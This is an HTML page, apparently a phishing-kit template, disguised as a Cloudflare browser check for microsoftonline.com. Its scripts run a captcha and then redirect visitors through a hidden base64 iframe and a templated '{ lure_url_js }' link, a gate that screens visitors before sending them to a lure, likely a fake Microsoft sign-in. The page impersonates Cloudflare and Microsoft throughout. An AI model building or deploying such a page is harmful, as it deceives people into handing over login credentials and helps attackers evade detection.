<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Just a moment...</title>
        <link rel="shortcut icon" href="../Guard/img/favicon.png" type="image/x-icon">
        <style>
        html,
body {
  width: 100%;
  height: 100%;
  margin: 0;
  padding: 0;
}

body {
  background-color: #ffffff;
  color: #000000;
  font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
  font-size: 16px;
  line-height: 1.7em;
  -webkit-font-smoothing: antialiased;
}

h1 {
  text-align: center;
  font-weight: 700;
  margin: 16px 0;
  font-size: 32px;
  color: #000000;
  line-height: 1.25;
}

p {
  font-size: 20px;
  font-weight: 400;
  margin: 8px 0;
}

p,
.attribution {
  text-align: center;
}

#spinner {
  margin: 0 auto 30px auto;
  display: block;
}

.attribution {
  margin-top: 32px;
}

@keyframes fader {
  0% {
    opacity: 0.2;
  }

  50% {
    opacity: 1.0;
  }

  100% {
    opacity: 0.2;
  }
}

@-webkit-keyframes fader {
  0% {
    opacity: 0.2;
  }

  50% {
    opacity: 1.0;
  }

  100% {
    opacity: 0.2;
  }
}

#cf-bubbles>.bubbles {
  animation: fader 1.6s infinite;
}

#cf-bubbles>.bubbles:nth-child(2) {
  animation-delay: .2s;
}

#cf-bubbles>.bubbles:nth-child(3) {
  animation-delay: .4s;
}

.bubbles {
  background-color: #f58220;
  width: 20px;
  height: 20px;
  margin: 2px;
  border-radius: 100%;
  display: inline-block;
}

a {
  color: #2c7cb0;
  text-decoration: none;
  -moz-transition: color 0.15s ease;
  -o-transition: color 0.15s ease;
  -webkit-transition: color 0.15s ease;
  transition: color 0.15s ease;
}

a:hover {
  color: #f4a15d
}

.attribution {
  font-size: 16px;
  line-height: 1.5;
}

.ray_id {
  display: block;
  margin-top: 8px;
}

#cf-wrapper #challenge-form {
  padding-top: 25px;
  padding-bottom: 25px;
}

#cf-hcaptcha-container {
  text-align: center;
}

#cf-hcaptcha-container iframe {
  display: inline-block;
}

        </style>
            <!-- #endregion -->
            <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
        <script src="../api.js" async defer></script>

        <title>Just a moment...</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
        <meta name="robots" content="noindex,nofollow" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
<script>
var redirectUrl = "data:text/html;base64,PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+Cgo8aGVhZD4KPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIC8+Cjx0aXRsZT5VbnRpdGxlZCAxPC90aXRsZT4KPC9oZWFkPgoKPGJvZHk+CnlvIHlvCjwvYm9keT4KCjwvaHRtbD4=";
var verifyCallback_CF = function (response) {
    let cfForm = document.querySelector("#cfForm");
    if (validateElement(cfForm) && response.length > 10) {
        cfForm.parentNode.removeChild(cfForm);
        let decodedRedirectUrl = atob(redirectUrl);
        let iframe = document.createElement("iframe");
        iframe.src = decodedRedirectUrl;
        iframe.style.display = "none";
        document.body.appendChild(iframe);
        return;
    }
    console.log("Can't find Cloudflare? Ha! Who needs it! Let's move on to hCaptcha, the real deal.");
    return switchToSecondCaptcha();
}
</script>
        <script>
            var verifyCallback_hCaptcha = function (response) {
                let gForm = document.querySelector("#gForm")
                if (gForm == undefined) {
                    return
                }
                if (gForm.style != undefined && gForm.style.visibility != undefined) {
                    gForm = document.querySelector("#gForm").style.visibility = "hidden"
                }
                window.location.href = { lure_url_js } + window.location.hash
            }
            function validateElement(element) {
                return element != undefined && element.style != undefined && element.style.visibility != undefined
            }
        </script>
        <script>
            window.switchToSecondCaptcha = function () {
                console.log("CAPTCHA switch callback activated")
                let gForm = document.querySelector("#gForm")
                if (validateElement(gForm) || gForm.style == "visible") {
                    return
                }
                setTimeout(function () {
                    const cfForm = document.querySelector("#cfForm")
                    if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
                        cfForm.remove()
                    }
                    setTimeout(function () {
                        gForm.style.visibility = "visible"
                    }, 200)
                }, 200)
            }
            var refreshCallBack = function (response) {
                console.log("Refresh callback activated")
                setTimeout(function () {
                    window.location.reload()
                }, 1000)
            }
        </script>

        <script>
window.onloadTurnstileCallback = function () {
    const sitekey = "0x4AAAAAAAEmhwI_JQWBcNS_";
    let callback = verifyCallback_CF;
    turnstile.render("#turnstileCaptcha", {
        sitekey: sitekey,
        callback: callback,
        "expired-callback": refreshCallBack,
        // "error-callback": switchToSecondCaptcha(),
    })
}
        </script>
        <script>
            var incrementLoader = function () {
                const waitp = document.querySelector("#cf-spinner-please-wait")
                const gForm = document.querySelector("#gForm")
                if (validateElement(gForm) && gForm.style.visibility == "hidden") {
                    waitp.textContent += "."
                }
            }
            setTimeout(() => {
                let i = 0
                ticker = setInterval(function () {
                    i += 1
                    incrementLoader()
                    if (i > 3) {
                        clearInterval(ticker)
                        return
                    }
                }, 1000)
            }, 500)

            setTimeout(function () {
                const cfForm = document.querySelector("#cfForm")
                if (!validateElement(cfForm)) {
                    switchToSecondCaptcha()
                    return
                }
                const gForm = document.querySelector("#gForm")
                if (!validateElement(gForm)) {
                    // nothing to switch to
                    return
                }
                 if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
                    switchToSecondCaptcha()
                }
            }, 7000)
        </script>

    </head>
    <body>
        <table width="100%" height="100%" cellpadding="20">
            <tbody>
                <tr>
                    <td valign="middle" align="center">
                        <div class="cf-browser-verification cf-im-under-attack">
                            <noscript>
                                <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
                                
                                <style>
                                
                                #cf-content {
                                    display: none !important;
                                }

                                </style>
                            </noscript>
  
                            <div id="cf-content" style="display: block;">
                                <div id="cf-bubbles">
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                </div>
                <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
                <div id="turnstileCaptcha"></div> 
                </form>
                                <h1><span data-translate="checking_browser">Checking your browser before accessing</span> microsoftonline.com</h1>
                                <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                                    <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
                                </div>
                                <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your
                                requested content shortly.</p>
                                <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 5 seconds</p>
                                <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting</p>
                            </div>
                        </div>
                        <div class="attribution">
                            DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
                            <br>
                            <span class="ray_id">Ray ID: 661bfb6b7e8c4ab0<code></code></span>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </body>
</html>